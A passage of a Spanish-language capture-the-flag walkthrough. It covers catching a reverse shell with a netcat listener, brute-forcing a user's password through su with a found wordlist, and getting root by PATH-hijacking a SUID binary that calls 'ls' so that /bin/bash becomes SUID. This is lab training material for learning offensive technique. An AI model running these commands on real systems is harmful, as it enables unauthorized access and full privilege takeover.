> gdb (pwndbg)

```shell
run
```

> host

```shell
nc -lvnp <PORT>
```

Y finalmente en otra terminal de nuestro `host` tendremos que ejecutar el script y asi obtender la shell:

```shell
python3 step4.py
```

Y si nos vamos a la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.186] from (UNKNOWN) [172.17.0.2] 40602
whoami
securedev
```

## Escalate user johntheripper

Primero tendremos que sanitizar la shell (TTY):

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Si listamos la misma carpeta en la que estamos, podremos ver un archivo llamado `hashfile`, su contenido seria el siguiente:

```
This is for you, john the ripper:

21571b31a8d2e8b03690989835872cc6
```

Si intentamos crackearlo con `john` no conseguiremos nada, pero si seguimos enumerando, encontraremos lo siguiente en la siguiente ruta:

Primero buscaremos archivos creados por el usuario `johntheripper`:

```shell
find / -type f -type f -user johntheripper 2>/dev/null
```

Info:

```
/opt/.hidden/words
```

Vemos que hay un archivo interesante en esa ruta y ese archivo contiene lo siguiente:

```
I love these words:

test123test333
333300trest
trest00aa20_
_23t_32_g4
testnefg321ttt
trestre2612t33s
11tv1e0st!!!!!
!!10t3bst??
tset0tevst!
ts!tse?test01
_0test!X!test0
0143_t3s5t53_0
```

Podemos deducir que alguna de esas palabras puede ser la contraseña del usuario `johntheripper`, por lo que nos descargaremos un script para hacer fuerza bruta a un usuario con `su`:

URL = [Download suBrutefoce.sh](https://github.com/D1se0/suBruteforce/blob/main/suBruteforceBash/suBruteforce.sh)

Ahora cogemos esas palabras y las metemos en un archivo `.txt`:

> dic.txt

```
test123test333
333300trest
trest00aa20_
_23t_32_g4
testnefg321ttt
trestre2612t33s
11tv1e0st!!!!!
!!10t3bst??
tset0tevst!
ts!tse?test01
_0test!X!test0
0143_t3s5t53_0
```

Y ahora utilizaremos la herramienta de la siguiente forma:

```shell
bash suBruteforce.sh johntheripper dic.txt
```

Info:

```
[+] Contraseña encontrada para el usuario johntheripper:tset0tevst!
```

Por lo que vemos esa es la contraseña, por lo que haremos lo siguiente:

```shell
su johntheripper
```

Y metemos la contraseña `tset0tevst!`, por lo que ya seremos dicho usuario.

## Escalate Privileges

Si buscamos permisos `SUID` vemos lo siguiente:

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
2626066     16 -rwsr-xr-x   1 root     root        16064 Sep  6 14:18 /home/johntheripper/show_files
  2621600   1384 -rwsr-xr-x   1 root     root      1414168 Jul  9 08:53 /usr/sbin/exim4
  2490617     52 -rwsr-xr-x   1 root     root        52880 Mar 23  2023 /usr/bin/chsh
  2490741     48 -rwsr-xr-x   1 root     root        48896 Mar 23  2023 /usr/bin/newgrp
  2490752     68 -rwsr-xr-x   1 root     root        68248 Mar 23  2023 /usr/bin/passwd
  2490804     72 -rwsr-xr-x   1 root     root        72000 Mar 28  2024 /usr/bin/su
  2490678     88 -rwsr-xr-x   1 root     root        88496 Mar 23  2023 /usr/bin/gpasswd
  2490736     60 -rwsr-xr-x   1 root     root        59704 Mar 28  2024 /usr/bin/mount
  2490828     36 -rwsr-xr-x   1 root     root        35128 Mar 28  2024 /usr/bin/umount
  2490611     64 -rwsr-xr-x   1 root     root        62672 Mar 23  2023 /usr/bin/chfn
```

Vemos que tenemos un archivo en nuestra carpeta llamado `show_files` y que tiene permisos `SUID`.

Si por ejemplo ejecutamos dicha aplicacion de esta forma:

```shell
./johntheripper/show_files
```

Info:

```
johntheripper  securedev
```

Por lo que vemos nos lista los archivos cuando lo ejecutamos, por lo que haremos lo siguiente.

Primero nos vamos a pasar la herramienta a nuestra maquina atacante, para analizarla mucho mejor:

> Maquina victima

```shell
python3 -m http.server
```

> Maquina atacante

```shell
wget http://<IP>:8000/show_files
```

### Ghidra Tool

Podremos utilizar una herramienta para analizar un binario compilado o este tipo de cosas, para poder verlo en texto plano y decompilarlo, si utilizamos `Ghidra` de la siguiente manera:

```shell
sudo apt install ghidra
```

Y lo ejecutamos:

```shell
ghidra
```

Se nos abrira una aplicacion, en la cual tendremos que cargar el archivo que nos pasamos a la maquina atacante, de la siguiente forma:

Le daremos al siguiente boton:

<figure><img src="../../.gitbook/assets/image (141) (1).png" alt=""><figcaption></figcaption></figure>

Se nos abrira otra ventana mas grande en la cual tendremos que cargar el archivo `show_files`, le daremos a `File` -> `Import File...` -> seleccionamos el archivo a decompilar y nos mostrara la informacion en texto plano de basicamente la funciona de la aplicacion en la parte derecha del programa, viendo lo siguiente:

```c
undefined8 main(void)

{
  setuid(0);
  setgid(0);
  system("ls");
  return 0;
}
```

### PATH Hijacking

Por lo que vemos esta ejecutando el `ls` de forma insegura, ya que no pilla la ruta absoluta, por lo que podremos realizar la tecnica de `PATH Hijacking`, de la siguiente forma, nos iremos a la maquina victima y haremos esto:

```shell
echo -e '#!/bin/bash\nchmod u+s /bin/bash' > /tmp/ls
```

```shell
export PATH=/tmp/:$PATH
./home/johntheripper/show_files
```

Y con esto ya habremos puesto con permisos `SUID` la `bash`, podremos verificarlo de la siguiente forma:

```shell
/bin/ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1265648 Mar 29  2024 /bin/bash
```

Por lo que ahora pondremos lo siguiente:

```shell
bash -p
```

Y con esto ya seremos `root`.
